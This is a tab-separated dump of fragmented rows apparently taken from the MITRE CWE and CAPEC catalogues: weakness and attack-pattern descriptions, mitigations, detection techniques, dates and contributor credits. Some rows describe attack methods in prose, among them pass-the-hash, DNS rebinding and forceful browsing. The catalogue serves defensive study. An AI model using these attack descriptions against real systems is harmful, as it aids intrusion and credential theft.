23466	39	2017-11-08
15630	62	updated Common_Consequences
10390	91	Architecture and Design
18932	39	2012-05-11
17240	76	2018-07-31
10819	62	updated Demonstrative_Examples
19996	39	2012-10-30
11189	62	updated Other_Notes, References
17581	62	updated Common_Consequences
21799	54	Medium
12832	28	Eric Dalci
10718	56	ChildOf
14631	62	updated Potential_Mitigations
19717	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.
19727	39	2011-06-01
10266	94	Run Arbitrary Code
17615	35	MITRE
21884	28	Eric Dalci
6361	63	Unexpected State
8059	81	Access Control
16680	28	CWE Content Team
7910	56	ChildOf
8392	47	Gain Privileges
7802	31	699
12749	102	CanFollow
11861	45	Variant
12598	78	High
17390	35	MITRE
8819	45	Base
8612	40	An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.
23884	39	2012-05-11
19043	35	MITRE
17182	47	Read Data
6304	31	699
14728	47	Read Data
17104	44	High
15527	28	CWE Content Team
19532	28	CWE Content Team
8013	35	MITRE
12065	88	Improper Handling of Case Sensitivity
8237	72	If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate.
10450	39	2009-07-27
6495	53	The MITRE Corporation
9934	23	An attacker replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.
7533	56	ChildOf
8557	39	2008-09-08
7431	90	Language-Independent
14922	26	Implementation
8238	99	Wiley
10998	70	Wikipedia
17900	39	2011-06-27
25438	55	CAPEC Content Team
6763	99	SANS Software Security Institute
8914	101	CAPEC Content Team
18937	35	MITRE
18786	48	10
7277	69	Draft
18106	35	MITRE
12936	89	Meta
7101	89	Detailed
8853	28	CWE Content Team
19623	39	2014-06-23
12546	28	CWE Content Team
12993	26	Architecture and Design
21426	28	CWE Content Team
24192	62	updated Taxonomy_Mappings
24311	28	CWE Content Team
18422	104	240
19672	103	Primary
19897	103	Primary
16487	39	2019-06-20
12818	30	Hal Burch
18316	28	CWE Content Team
18601	35	MITRE
14425	62	updated Demonstrative_Examples
8004	104	277
7843	35	MITRE
16552	39	2019-06-20
9631	102	ChildOf
22894	102	ChildOf
24880	39	2008-09-08
7834	39	2011-06-27
17205	62	updated Demonstrative_Examples
18925	39	2008-07-01
25019	28	CWE Content Team
21037	43	Simple
8683	39	2008-07-01
11850	28	CWE Content Team
13915	23	The software performs reverse DNS resolution on an IP address to obtain the hostname and make a security decision, but it does not properly ensure that the IP address is truly associated with the hostname.
20101	35	MITRE
24620	62	updated Relationships, Taxonomy_Mappings
14199	97	Mobile Device Fault Injection
20411	61	Stable
18319	36	http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html
22756	44	Moderate
24614	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.                   Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.
17962	80	Adversaries require non-trivial technical skills to create and implement fault injection attacks. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required.
10055	35	MITRE
5889	25	Medium
15566	28	CWE Content Team
8758	102	ChildOf
22141	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
15808	39	2011-06-27
19782	31	699
17438	28	CWE Content Team
10463	61	Draft
11718	57	Indirect
12550	39	2019-01-03
21021	35	MITRE
9413	63	Unexpected State
24206	56	CanAlsoBe
10358	102	ChildOf
18356	50	Implementation: Prefer working without user input when using file system calls
9346	50	Check your program for buffer overflow and format String vulnerabilities which can lead to execution of malicious code.
9332	35	MITRE
9780	58	The Struts Validator uses a form's validate() method to check the contents of the form properties against the constraints specified in the associated validation form. That means the following classes have a validate() method that is part of the validation framework: ValidatorForm, ValidatorActionForm, DynaValidatorForm, and DynaValidatorActionForm. If you create a class that extends one of these classes, and if your class implements custom validation logic by overriding the validate() method, you must call super.validate() in your validate() implementation.
19758	35	MITRE
6785	69	Incomplete
10949	85	51
10384	23	An attacker employs forceful browsing to access portions of a website that are otherwise unreachable through direct URL entry. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.
20012	92	Experiment
15367	39	2012-05-11
5645	42	A developer can use a "frame-breaker" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.                   It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The "frame-breaking" script does not intuitively account for multiple nested frames that can be presented to the user.
5624	89	Detailed
23997	26	Operation
16647	103	Primary
20661	92	Experiment
17885	61	Draft
15028	103	Primary
22821	30	Emiliano De Cristofaro
9104	89	Standard
20251	35	MITRE
24392	50	Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.
6340	53	The MITRE Corporation
11566	95	An adversary crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.
11499	89	Standard
13180	39	2008-07-01
9835	28	CWE Content Team
10120	39	2009-03-10
12319	31	1000
16246	23	An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there.
22271	35	MITRE
14946	39	2012-10-30
7445	57	Resultant
15237	81	Other
17734	81	Other
20826	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10446	63	Varies by Context
5723	101	CAPEC Content Team
18562	39	2011-06-01
21678	91	Implementation
5892	39	2008-07-01
17448	28	CWE Content Team
16913	66	Exploiting misuse of Python's "pickle"
14979	103	Primary
18984	56	PeerOf
21231	35	MITRE
10539	45	Base
16032	62	updated Common_Consequences, Description, Other_Notes
11688	40	An application requires access to external libraries.
13123	30	M. Mahemoff
6008	103	Primary
13995	39	2009-05-27
21555	39	2014-06-23
16883	81	Other
21820	35	MITRE
13733	36	http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf
14244	35	MITRE
14099	28	CWE Content Team
5741	39	2009-10-29
19479	63	Alter Execution Logic
14218	35	MITRE
7169	55	CAPEC Content Team
8194	39	2008-07-01
24474	62	updated Common_Consequences, Description, Modes_of_Introduction, Other_Notes
7312	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html
8011	80	The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way.
6666	35	MITRE
23124	72	An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database.
20074	90	C++
21763	21	CWE Content Team
21635	62	updated Demonstrative_Examples
18107	35	MITRE
7822	35	MITRE
9782	35	MITRE
19105	21	CLASP
19444	39	2012-05-11
11451	39	2019-01-03
9698	28	CWE Content Team
11342	60	13
22508	79	Availability
17510	102	ChildOf
12893	62	updated Description, Name, Relationship_Notes
17648	39	2012-05-11
18020	100	The MITRE Corporation
22079	53	The MITRE Corporation
15938	28	CWE Content Team
20943	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
23050	101	CAPEC Content Team
11067	21	CWE Content Team
13949	28	CWE Content Team
23427	97	Bypassing Physical Security
18045	69	Draft
20006	62	updated Common_Consequences, Demonstrative_Examples
22805	39	2008-09-08
21211	23	The source code does not follow     desired style or formatting for indentation, white     space, comments, etc.
20817	90	Language-Independent
24112	91	Distribution
8221	23	The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.
7457	39	2011-06-01
6216	80	Basic knowledge about websites: obtaining them, designing and implementing them, etc.
12458	39	2012-05-11
22544	28	CWE Content Team
25322	66	Web Applications and LDAP Injection
14114	56	ChildOf
15420	72	If security-critical decisions rely on a variable having a "0" or equivalent value, and the programming language performs this initialization on behalf of the programmer, then a bypass of security may occur.
12154	35	MITRE
6416	103	Primary
9849	96	2018-07-02
14603	23	Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.
24798	43	Simple
19356	79	Integrity
6876	85	7
21274	39	2011-06-01
8406	61	Draft
21875	81	Confidentiality
22330	91	Build and Compilation
11481	79	Integrity
9243	39	2008-09-08
17791	39	2012-05-11
12071	95	[Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source.
14346	62	updated Potential_Mitigations
17214	28	CWE Content Team
10857	69	Draft
20247	70	OWASP Testing Guide
23619	62	updated Description, Name
21368	62	updated Relationships
13948	85	533
6017	39	2014-07-30
9493	28	CWE Content Team
14325	45	Variant
6578	28	CWE Content Team
10878	79	Confidentiality
9834	67	High
23937	21	CLASP
12060	62	updated Common_Consequences
20803	28	CWE Content Team
11888	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
16101	39	2012-05-11
5941	62	updated Relationships
6285	26	Architecture and Design
21147	45	Base
14424	100	The MITRE Corporation
12218	36	http://ha.ckers.org/xss.html
11464	103	Primary
18553	61	Stable
22119	26	Implementation
22176	28	CWE Content Team
6623	62	updated Relationships
24346	91	Implementation
24408	28	CWE Content Team
16878	62	updated Common_Consequences
16198	35	MITRE
12588	31	1000
22468	62	updated Relationships, Taxonomy_Mappings
14494	28	CWE Content Team
17958	102	ChildOf
9350	35	MITRE
15266	31	699
7704	35	MITRE
23807	81	Confidentiality
16703	80	An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known.
22531	44	SOAR Partial
8186	28	Eric Dalci
18143	45	Base
16248	66	Top 25 Series - Rank 19 - Missing Authentication for Critical Function
13626	100	The MITRE Corporation
9316	45	Variant
17941	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
17953	31	1000
25055	56	ChildOf
15231	33	Caleb Sima
17361	28	CWE Content Team
17826	92	Exploit
20071	42	When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.
17187	35	MITRE
6617	39	2017-11-08
23284	42	Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.
19255	74	2
7611	28	CWE Content Team
13266	35	MITRE
19751	28	Eric Dalci
8893	45	Variant
13261	43	Simple
24756	35	MITRE
7471	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
19077	28	CWE Content Team
21283	62	updated Potential_Mitigations
10301	35	Cigital
6093	104	372
17488	95	[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.
23738	43	Simple
6950	90	C
22263	28	Eric Dalci
14251	104	284
24063	35	MITRE
16444	62	updated Description
10143	35	MITRE
18538	35	MITRE
10541	26	Implementation
25026	26	Operation
19156	43	Simple
19941	26	Architecture and Design
11057	56	ChildOf
17827	81	Confidentiality
6630	28	CWE Content Team
18444	56	ChildOf
16462	28	CWE Content Team
21963	63	Execute Unauthorized Code or Commands
25222	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters that could be interpreted as web-scripting elements when they are sent to an error page.
16613	104	1120
25167	28	CWE Content Team
21656	35	Cigital
6504	62	added/updated demonstrative examples
21024	62	updated Demonstrative_Examples
14614	63	Unexpected State
13581	35	MITRE
6410	62	updated Relationships
23413	62	updated Potential_Mitigations, Research_Gaps, Terminology_Notes
7669	91	Operation
12130	28	CWE Content Team
18989	64	2019-09-30
18781	62	updated Observed_Examples
18787	69	Incomplete
6484	39	2012-10-30
21628	35	MITRE
21090	35	MITRE
13875	61	Draft
14157	28	CWE Content Team
19538	104	911
22695	40	The target data stream must be transmitted on a medium to which the adversary has access.
15754	39	2014-07-30
17212	81	Integrity
11940	35	MITRE
23304	39	2014-07-30
21097	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
22473	63	Execute Unauthorized Code or Commands
11876	76	2017-01-09
7784	39	2008-07-01
9075	57	Primary
21872	91	Implementation
21086	42	Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands.
14598	62	updated Related_Attack_Patterns, Relationships
23470	45	Class
15065	88	Incomplete Comparison with Missing Factors
17803	97	Man in the Middle Attack
22071	26	Implementation
11570	35	Cigital
15970	81	Other
8303	88	Improper Check for Unusual or Exceptional Conditions
21875	63	Read Application Data
10613	26	Architecture and Design
18649	62	updated Relationships, Taxonomy_Mappings
19044	32	The Open Web Application Security Project (OWASP)
10551	46	This situation is amplified if the software allows malicious users or attackers to consume more resources than their access level permits. Exploiting such a weakness can lead to asymmetric resource consumption, aiding in amplification attacks against the system or the network.
11782	63	Read Application Data
10356	47	Read Data
22190	62	updated Potential_Mitigations
19698	62	updated Relationships, Taxonomy_Mappings
9200	61	Draft
17483	91	Requirements
15659	39	2009-07-27
11649	31	1000
9495	62	updated Applicable_Platforms
24029	28	CWE Content Team
11359	28	CWE Content Team
17652	49	2004
7201	92	Experiment
15949	61	Draft
23267	103	Primary
12155	39	2012-05-11
12606	35	MITRE
9589	47	Other
8148	35	MITRE
12533	62	updated Taxonomy_Mappings
19608	80	If the attacker has to perform SQL injection blindly
6030	69	Incomplete
16127	55	CAPEC Content Team
11218	39	2008-09-08
15874	96	2011-03-24
19361	35	MITRE
13725	23	An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, "piggy-backing" on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level.
23125	35	Cigital
13915	88	Reliance on Reverse DNS Resolution for a Security-Critical Action
21049	40	Information pertaining to the target organization on how to best execute a USB Drop Attack.
19551	35	MITRE
15752	59	Updated Related_Attack_Patterns
19875	35	MITRE
20464	56	ChildOf
14214	89	Standard
12757	78	Low
17802	39	2009-05-27
9106	79	Integrity
19748	35	MITRE
9588	59	Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Payload_Activation_Impact, Probing_Techniques, Related_Attack_Patterns, Resources_Required
8867	35	MITRE
6076	28	CWE Content Team
7517	59	Updated Alternate_Terms, Description, Execution_Flow, Indicators, Related_Attack_Patterns
23388	39	2008-07-01
14433	56	ChildOf
17258	89	Detailed
13322	69	Incomplete
8187	62	updated Description, Name
10015	39	2008-10-14
16301	59	Updated Attack_Phases, Resources_Required
24339	69	Draft
20193	89	Standard
9702	39	2012-10-30
6700	63	Modify Application Data
17933	31	1003
24454	97	Use of Known Domain Credentials
22983	77	Automated Static Analysis
14751	62	updated Common_Consequences
17261	56	ChildOf
22678	35	MITRE
15307	81	Access Control
14080	35	MITRE
16709	21	PLOVER
12903	62	updated Demonstrative_Examples
17798	56	ChildOf
18883	76	2017-08-04
14337	74	2
14862	28	CWE Content Team
6971	28	CWE Content Team
11215	101	CAPEC Content Team
5906	39	2013-02-21
21183	35	MITRE
15724	33	Microsoft
6813	46	The developer - or customers - may wish to restrict or eliminate use of a function, library, or third party component for any number of reasons, including real or suspected vulnerabilities; difficulty to use securely; export controls or license requirements; obsolete or poorly-maintained code; internal code being scheduled for deprecation; etc.   To reduce risk of vulnerabilities, the developer might maintain a list of "banned" functions that programmers must avoid using because the functions are difficult or impossible to use securely.  This issue can also make the software more costly and difficult to maintain.
16641	62	updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
24090	62	updated Observed_Examples, Related_Attack_Patterns
19313	45	Variant
9237	39	2012-05-11
6463	100	The MITRE Corporation
13356	53	The MITRE Corporation
19055	77	Automated Static Analysis - Binary or Bytecode
8451	85	4
7558	35	Cigital
12061	39	2009-05-27
6661	35	MITRE
6174	89	Detailed
24068	70	Exploiting Format String Vulnerabilities
11640	81	Integrity
14348	39	2011-06-01
25236	76	2015-11-09
18465	91	Implementation
22440	39	2009-01-12
19126	49	2004
8948	62	updated Time_of_Introduction
15703	76	2017-05-01
20919	78	Low
17473	28	CWE Content Team
25378	103	Primary
15486	102	CanPrecede
16156	35	MITRE
14597	28	CWE Content Team
19314	77	Manual Static Analysis - Binary or Bytecode
7156	55	CAPEC Content Team
9638	31	1000
18136	28	CWE Content Team
17641	62	updated Common_Consequences, Description, Other_Notes, Potential_Mitigations
11650	62	updated Potential_Mitigations
14271	28	Eric Dalci
11841	28	CWE Content Team
18432	89	Detailed
24178	28	CWE Content Team
12175	40	Target software processes binary resource files.
20806	62	updated Name
13293	43	Simple
11293	74	1
12409	97	ICMP Information Request
13930	55	CAPEC Content Team
19372	62	updated Relationships
19071	78	High
10672	23	The software uses the same control element across multiple      architectural layers.
23790	54	High
7263	35	MITRE
9939	28	Sean Eidemiller
11907	62	updated Relationships
9997	76	2017-08-04
6063	39	2012-05-11
17625	62	updated Name
19311	88	Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')
8275	26	Architecture and Design
7271	39	2011-06-01
11294	39	2009-10-29
15894	62	added/updated demonstrative examples
12235	35	MITRE
8055	62	updated Relationships
17926	53	The MITRE Corporation
24309	42	Avoid using the double-checked locking pattern in language versions that cannot guarantee thread safety. This pattern may be used to avoid the overhead of a synchronized call, but in certain versions of Java (for example), this has been shown to be unsafe because it still introduces a race condition (CWE-209).
16079	35	MITRE
5861	50	Design: Encrypt all communication between the client and server.
12458	28	CWE Content Team
19844	45	Variant
15933	35	MITRE
17244	28	CWE Content Team
13500	39	2017-11-08
17923	44	High
21898	47	Hide Activities
15738	39	2019-01-03
19211	70	The night the log was forged
14603	43	Simple
14026	60	03
7843	39	2019-06-20
19273	54	Medium
5772	39	2009-05-27
10848	35	MITRE
20575	62	updated Other_Notes, Potential_Mitigations
10344	95	The attacker exploits the bug that she has found. For instance she can try to inject and execute arbitrary code or write to OS resources.
24509	62	updated Relationships
21611	26	Operation
5713	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
11763	28	CWE Content Team
8210	39	2012-10-30
18198	72	The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects.
16656	77	Dynamic Analysis with Automated Results Interpretation
20212	28	Eric Dalci
24778	36	http://www.vordel.com/downloads/rsa_conf_2006.pdf
21944	28	CWE Content Team
13875	89	Standard
14838	77	Automated Static Analysis - Binary or Bytecode
11988	63	Execute Unauthorized Code or Commands
8873	35	Cigital
18130	39	2019-06-20
9141	103	Primary
10814	88	Insecure Preserved Inherited Permissions
23283	79	Integrity
6337	90	Language-Independent
17218	69	Incomplete
18660	91	Architecture and Design
17652	33	Greg Hoglund
12654	73	Attacker takes existing automated tools to recognize the type and the version of the web server in use.
18479	86	http://www.omg.org/spec/ASCMM/1.0
22510	35	MITRE
8465	63	Read Files or Directories
10578	35	MITRE
17055	88	Untrusted Search Path
16339	26	Implementation
8708	81	Integrity
11911	55	CAPEC Content Team
9531	31	1000
20666	39	2019-06-20
6865	35	MITRE
23704	28	CWE Content Team
22043	69	Incomplete
23084	35	MITRE
19444	28	CWE Content Team
9745	39	2014-07-30
18192	39	2009-03-10
9626	50	Use of sxstrace.exe on Windows as well as manual inspection of the manifests.
6493	91	Architecture and Design
5635	28	CWE Content Team
5586	35	MITRE
15586	74	2
17254	86	http://searchsoftwarequality.techtarget.com/expert/KnowledgebaseAnswer/0,289625,sid92_gci1168442,00.html?asrc=SS_CLA_302%20%20558&psrc=CLT_92#
16013	91	Operation
25296	28	CWE Content Team
20511	90	C
20891	104	488
19734	62	updated Relationships
9852	102	ChildOf
16054	31	1000
25369	69	Incomplete
22586	39	2013-02-21
9276	72	An attacker could create a request to exploit a number of weaknesses including 1) the request can trick the web server to associate a URL with another URLs webpage and caching the contents of the webpage (web cache poisoning attack), 2) the request can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the request can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack).
22512	100	The MITRE Corporation
8663	81	Confidentiality
21958	62	updated Name
19617	62	updated Potential_Mitigations
11290	56	ChildOf
17723	23	An adversary uses stolen hash values for a user's credentials (username and password) to access systems managed under the same credential framwork that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. When authenticating via LM or NTLM, the hashed credentials' associated plaintext credentials are not requried for successful authentication. Therefore, if an adversary can obtain the hashed credentials of a user, he can then pass these hash values to the server or service to authenticate without needing to brute-force the hashes to obtain their cleartext values. The adversary can then impersonate the user and laterally move within the network. This technique can be performed against any operating system which leverages the LM or NTLM protocols.
18976	27	A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).
25290	69	Incomplete
14990	67	Medium
18069	35	MITRE
24130	28	CWE Content Team
10627	102	ChildOf
17023	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
22342	56	ChildOf
24734	31	1000
17674	62	updated Common_Consequences
22471	102	ChildOf
6726	104	369
24643	78	Low
9898	28	CWE Content Team
11831	39	2008-09-08
7800	76	2018-07-31
17461	28	CWE Content Team
19935	23	The product does not properly control the amount of recursion that takes place, which consumes excessive resources, such as allocated memory or the program stack.
21099	42	Use umask() with the correct argument.
23576	42	Adjust configurations appropriately when software is transitioned from a debug state to production.
23560	33	Anthony Bellissimo
12869	23	The software, upon installation, sets incorrect permissions for an object that exposes it to an unintended actor.
22341	62	updated Likelihood_of_Exploit, Taxonomy_Mappings
9414	83	v4 [DRAFT]
7350	103	Primary
14556	35	MITRE
22589	79	Confidentiality
7764	45	Class
22422	40	None
18983	100	The MITRE Corporation
19376	39	2010-12-13
7851	62	updated Common_Consequences
22709	39	2012-10-30
15292	39	2011-06-01
24663	59	Updated References
22851	45	Class
9659	39	2009-07-27
23352	28	Eric Dalci
23263	23	An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.
23728	28	CWE Content Team
6748	35	MITRE
17828	81	Confidentiality
22072	33	Mitja Kolsek
22374	62	updated Relationships, Taxonomy_Mappings
24777	42	Developers should anticipate that inconsistent special elements will be injected/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
15578	91	Build and Compilation
15860	31	1000
7786	101	CAPEC Content Team
23488	62	updated Time_of_Introduction
11332	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14787	79	Access Control
10455	62	updated Potential_Mitigations
16780	79	Other
6522	39	2008-11-24
14682	39	2017-11-08
18682	39	2009-12-28
24456	39	2008-07-01
7068	62	updated Relationships, Taxonomy_Mappings
19550	62	updated References
10284	93	High
15662	81	Integrity
23290	35	MITRE
13312	90	PHP
12969	80	An attacker can try variation of the slashes characters.
18618	72	A user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts.
6016	28	CWE Content Team
23169	21	CLASP
20598	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
16561	104	704
22021	39	2012-05-11
12929	28	CWE Content Team
18209	56	ChildOf
21197	62	updated Relationships, Taxonomy_Mappings
7949	56	ChildOf
24753	100	The MITRE Corporation
6702	35	MITRE
13481	28	CWE Content Team
8478	35	MITRE
5922	62	updated Description, Maintenance_Notes, Relationships, Taxonomy_Mappings
24046	28	CWE Content Team
22907	28	CWE Content Team
13585	28	CWE Content Team
11428	28	CWE Content Team
16220	33	Microsoft
23280	42	Use an input validation framework such as Struts or the OWASP ESAPI Validation API. If you use Struts, be mindful of weaknesses covered by the CWE-101 category.
24749	62	updated Applicable_Platforms, Causal_Nature, Functional_Areas, Likelihood_of_Exploit, Other_Notes, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
15489	62	updated Common_Consequences
22380	39	2012-10-30
7981	39	2008-09-08
16775	59	Updated Related_Attack_Patterns
23742	63	Unexpected State
7683	76	2019-09-30
23180	39	2014-02-18
10072	56	ChildOf
14068	28	CWE Content Team
12520	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
5616	28	CWE Content Team
21619	25	Medium
19676	56	ChildOf
13922	73	Use automated tool to record all instances to process XML requests or find exposed WSDL.
13611	28	CWE Content Team
15207	28	CWE Content Team
19399	35	MITRE
7938	55	CAPEC Content Team
11579	50	Implementation: Use indirect references rather than actual file names.
17735	104	772
7836	35	MITRE
13070	73	Place phishing link in post to online forum.
8123	78	High
22644	39	2018-03-27
15736	102	CanFollow
7577	62	updated Observed_Examples
18677	91	Implementation
17204	54	High
12140	39	2019-01-03
12582	39	2012-10-30
18134	35	MITRE
16462	39	2008-09-08
16907	69	Incomplete
25028	39	2012-10-30
17012	59	Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required
21779	62	updated Common_Consequences, Description, Relationships, Taxonomy_Mappings
17077	67	Medium
14445	61	Draft
24677	31	699
14451	35	MITRE
12935	88	Missing Check for Certificate Revocation after Initial Check
21383	28	CWE Content Team
7203	104	194
15822	62	updated Potential_Mitigations
10456	35	MITRE
23796	28	CWE Content Team
19420	53	The MITRE Corporation
23063	35	MITRE
23476	77	Manual Static Analysis - Source Code
17477	101	CAPEC Content Team
24146	42	Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.
16409	28	CWE Content Team
14062	66	Dynamic Evaluation Vulnerabilities in PHP applications
8291	81	Availability
11691	56	ChildOf
21569	50	Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.
14478	51	2014-06-23
16693	62	updated Relationships
20619	45	Base
23714	35	Cigital
19734	35	MITRE
19937	50	Disable MSSQL xp_cmdshell directive on the database
16388	39	2008-09-08
13234	33	Arjan van de Ven
13432	74	3
16253	102	ChildOf
15753	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
13948	78	High
13580	39	2008-11-24
23170	56	ChildOf
18482	35	MITRE
18849	72	Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.
14490	35	MITRE
6272	78	Low
23579	86	http://www.owasp.org/index.php/Top_10_2007-A9
20070	90	Language-Independent
11906	28	CWE Content Team
21128	39	2011-06-01
19041	50	Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.
16662	88	Use of RSA Algorithm without OAEP
8564	79	Integrity
12913	76	2017-01-09
11466	23	An adversary cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more. By collecting this information an adversary may be able to learn important facts about the person or organization that play a role in helping the adversary in their attack.
23153	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
14120	39	2011-09-13
13706	35	Cigital
25230	45	Class
6377	62	updated Common_Consequences
20818	39	2008-07-01
15904	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.                   Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.
6639	26	Implementation
10830	62	updated Relationships
6879	62	updated Applicable_Platforms, Description, Name, Other_Notes, Potential_Mitigations, Terminology_Notes
12952	28	CWE Content Team
23958	28	CWE Content Team
24167	62	updated Relationships
23465	104	496
11433	88	Incorrect Provision of Specified Functionality
8098	55	CAPEC Content Team
19923	40	The application server does insufficient input data validation on the resource path requested by the user.
12277	72	An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.
14757	28	CWE Content Team
25261	35	MITRE
16422	50	Avoid interacting with suspicious sites or clicking suspicious links.                An organization should provide regular, robust cybersecurity training to its employees.
10789	49	2013
